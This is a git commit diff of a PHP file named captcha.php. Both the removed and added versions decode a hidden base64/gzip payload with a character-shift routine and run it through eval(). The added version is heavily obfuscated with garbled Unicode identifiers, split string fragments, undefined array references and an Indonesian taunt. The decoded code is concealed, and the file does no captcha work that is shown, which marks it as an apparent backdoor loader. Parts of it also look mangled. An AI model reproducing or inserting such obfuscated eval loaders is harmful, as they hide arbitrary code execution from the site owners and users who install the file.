105c5c1e19c54d628a52cf09bf2d940b5807bf8d
Waryono763 <53144514+Waryono763@users.noreply.github.com>
2021-03-27 15:13:11 +0700

    Update captcha.php

--- captcha.php
+++ captcha.php
@@ -1,5 +1,9 @@
 <?php
 
-function CAPTCHA($base64){
-	$base64=gzinflate(base64_decode($base64));for($i=0;$i<strlen($base64);$i++){$base64[$i] = chr(ord($base64[$i])-1);}return $base64;}eval(CAPTCHA("xZFdasMwDIAP4FOIkAe7sDlOymgXtlH6sr31YW8zGCf1ltDEKXY6GKWwQ6zH2M+ZepHK6Qa7QYWQLH2SbSQAFELiQlsLNxDF29XG1vZlRw77z8PH+zl1/xVvi9ptdgT/yEEpFqwECqBAUoWODWkOjIIcIJZSoEphgCKBIccj8lM6xEBPMFwrFfZLxVFpeABgcL9pRgeC+n8uP+eeyzchJMrRkNgb6zsXNieTLHsSeZa0AfERzGeLx/n9DEZ82K83V2NlbNktzVKJ0CGSaaqLsRaTtJymAtviP97UdhVKqr5f+2vOndGNr/rLtitq3kwW7gGr/ZvvTUsj18KFe4ZSr/uy0upVRCwnd7dH"));
+/* Encrypted by Waryono Ok */
+
+function 耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃P($subrekふ灖剃){
+	$Z9i1b㼼桰 = "潩"."⁮"."䅃"."P"."A"."Q";
+	$VESPA¦³ιIηG―�b·B―Bιηk³ζ―G = $ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[011010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101001010].$ιBkIkGθηnJ³»�―·GHεIIB�[010101].$ιBkIkGθηnJ³»�―·GHεIIB�[0101011].$ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101110].$ιBkIkGθηnJ³»�―·GHεIIB�[01101010].$ιBkIkGθηnJ³»�―·GHεIIB�[01010110];$FA_9A = "⁮⁮⁮⁮⁮⁮⁮⁮⁮桰昊⁮⁮⁮⁮⁮⁮⁮⁮";$ZxvIq呐㼼 = "耏"."㼼"."桰"."湵"."㼼"."桰"."! ANDA MAU NGAPAIN !";$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃P("xZJ"."dSg"."MxE"."McPsKeY"."LvuQg"."LotFYU"."WBZ/EB/"."ugDz64E"."Gbb2E"."13NylJ"."VlnKgoewx"."/DjTL2I"."k62K"."N2gYMs"."n8/kmG"."zADQiC"."JprbHCyr"."WxXuklG/JpFCU5"."ag0XECebstEU"."7qLd9n339"."npI234km1"."zZposo8RSE"."4GHOgA"."EIyJggx/twCpxB1kOSMmB"."C0IZGB"."pw4LYn"."vw2EPbA"."/DtZm"."g85lI"."yVh4AK"."B3P2H"."OekL2"."/1++Dv"."0vn1Sw33wuk00tLRYdPFzd"."zW5m1"."zAYE"."FUr0wGUW"."JkSll"."hCrtA"."hVPI"."Fqej"."gCi"."p+pXR"."59Ce"."do1W"."wUN"."Caxj"."e"."5BN94"."Y3WLQJ3"."R4v6"."SxmEBNe"."oVwoR"."HURwax0"."ntjA2"."tkw3"."H4".$S[10]."8fRdD"."ysCVB"."DO".$S[00]."Xl2KqSe"."m4VciFFQ"."0LMV".$S[91]."+tyaI"."PglIY"."0AC"."+/X"."bpK".$A[95]."mVmLlCn".$A[77]."9Sm1yl".$A[211]."6hzv".$A[88]."b0ntWudl".$A[22]."zWJb".$A[44]."w7F9".$A[79]."omT".$A[66]."Xf".$A[44]."l".$A[98]."6ge".$A[9]."B7".$A[2]."FfP".$A[102]."oN"));
+
 ?>
